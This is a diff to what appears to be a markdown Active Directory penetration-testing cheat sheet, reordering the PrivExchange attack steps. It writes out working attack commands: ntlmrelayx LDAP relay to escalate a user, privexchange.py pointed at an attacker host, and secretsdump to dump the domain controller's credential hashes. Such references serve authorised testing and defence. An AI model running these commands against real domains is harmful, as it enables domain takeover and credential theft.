@@ -377,7 +377,6 @@ Get-ObjectAcl -Identity "<OBJECT FQDN OR SID>" -ResolveGUIDs | Where-Object -Pro
 
 #### NTLMRelay
 - It is possible to abuse ACL with NTLMRelay abuse
-- Also possible to abuse Exchange Server: https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
 ```
 ntlmrelayx.py -t ldap://<DC IP> --escalate-user <USER>
 ```
@@ -557,10 +556,11 @@ Add-DomainGroupMember -Identity $group -Members $user -Verbose
 
 #### The attack using domain credentials
 - https://github.com/dirkjanm/privexchange/
+- Attack takes a minute!
 ```
-python3 privexchange.py -ah <ATTACKER HOST> <EXCHANGE SERVER> -u Username -d <DOMAIN NAME>
-
 sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --escalate-user <USER>
+
+python3 privexchange.py -ah <ATTACKER HOST> <EXCHANGE SERVER> -u Username -d <DOMAIN NAME>
 
 secretsdump.py <DOMAIN>/<USER>@<DC IP> -just-dc
 ```
@@ -1544,7 +1544,6 @@ Get-DomainForeignGroupMember -Domain <TARGET DOMAIN FQDN>
 Find-InterestingDomainAcl -Domain <TRUST FOREST>
 ```
 - Abuse ACL to other forest.
-
 
 ## Pam Trust
 - PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages. 
